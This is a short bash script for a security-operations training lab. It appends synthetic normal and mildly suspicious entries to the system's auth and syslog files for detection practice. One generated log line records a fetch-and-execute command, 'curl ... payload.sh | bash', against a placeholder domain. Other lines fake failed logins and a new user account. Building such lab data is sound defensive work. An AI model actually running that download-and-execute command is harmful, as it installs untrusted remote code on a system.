#!/bin/bash

# ==========================================
# SOC LAB - LINUX LOG GENERATION SCRIPT
# Generates normal + low-level suspicious logs
# Run as root: sudo ./generate_logs.sh
# ==========================================

AUTH_LOG="/var/log/auth.log"
SYS_LOG="/var/log/syslog"

echo "[+] Generating baseline logs..."

# --- Normal SSH logins ---
for i in {1..5}; do
    echo "$(date) sshd[$RANDOM]: Accepted password for normaluser from 192.168.56.10 port $((RANDOM%65535)) ssh2" >> $AUTH_LOG
done

# --- Normal sudo usage ---
for i in {1..3}; do
    echo "$(date) sudo: normaluser : TTY=pts/0 ; PWD=/home/normaluser ; USER=root ; COMMAND=/usr/bin/apt update" >> $AUTH_LOG
done

# --- Normal system activity ---
for i in {1..3}; do
    echo "$(date) systemd[1]: Started Daily apt download activities." >> $SYS_LOG
done

echo "[+] Generating low-level suspicious activity..."

# --- Suspicious: multiple login attempts (low volume) ---
for i in {1..3}; do
    echo "$(date) sshd[$RANDOM]: Failed password for invalid user admin from 192.168.56.20 port $((RANDOM%65535)) ssh2" >> $AUTH_LOG
done

# --- Suspicious: unusual process ---
echo "$(date) bash[$$]: curl http://suspicious-domain.test/payload.sh | bash" >> $SYS_LOG

# --- Suspicious: new user creation ---
echo "$(date) useradd[1337]: new user: name=backupadmin, UID=1002, GID=1002, home=/home/backupadmin, shell=/bin/bash" >> $AUTH_LOG

echo "[+] Log generation complete."
